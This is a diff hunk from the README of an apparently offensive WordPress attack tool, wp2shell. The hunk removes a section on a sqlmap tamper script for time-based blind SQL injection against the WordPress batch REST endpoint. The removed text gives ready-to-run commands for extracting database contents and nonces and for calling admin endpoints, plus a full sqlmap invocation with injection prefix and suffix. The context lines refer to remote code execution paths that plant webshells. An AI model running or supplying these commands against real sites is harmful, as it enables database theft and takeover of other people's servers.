@@ -371,40 +371,7 @@ Both RCE paths deploy webshells locked behind:
 The `--cleanup` flag deletes the plugin directory after execution. Without it, the tool
 prints the removal command.
 
----
 
-## `wp2shell_tamper.py` — sqlmap Integration
-
-Drop-in sqlmap tamper script that wraps payloads in the double-confusion batch
-structure. Also works standalone for time-based blind extraction with nonce
-recovery for admin endpoint calls.
-
-```bash
-# Standalone: extract DB info
-python3 wp2shell_tamper.py --target http://target/ --query "SELECT @@version"
-
-# Extract nonces and attempt admin endpoint call
-python3 wp2shell_tamper.py --target http://target/ --extract-nonce \
-  --admin-endpoint /wp/v2/users/me
-
-# With sqlmap (time-based blind) — requires --method=POST:
-sqlmap -u "http://target/wp-json/batch/v1" \
-  --data='{"placeholder":"INJECT"}' \
-  --method=POST \
-  --tamper=wp2shell_tamper \
-  --technique=T --time-sec=3 \
-  --prefix="0)" --suffix="-- -" \
-  --dbms=mysql -p placeholder \
-  --eval="import wp2shell_tamper; wp2shell_tamper.init_target('http://target/')"
-```
-
-> **Note:** sqlmap integration is limited — the tamper replaces the POST body but
-> sqlmap may not correctly set `Content-Type: application/json` or may parse the
-> JSON form data before the tamper runs. The standalone mode is recommended for
-> extraction; the built-in `wp2shell.py extract` command is faster and more
-> reliable for most use cases.
-
----
 
 ## Limitations
 
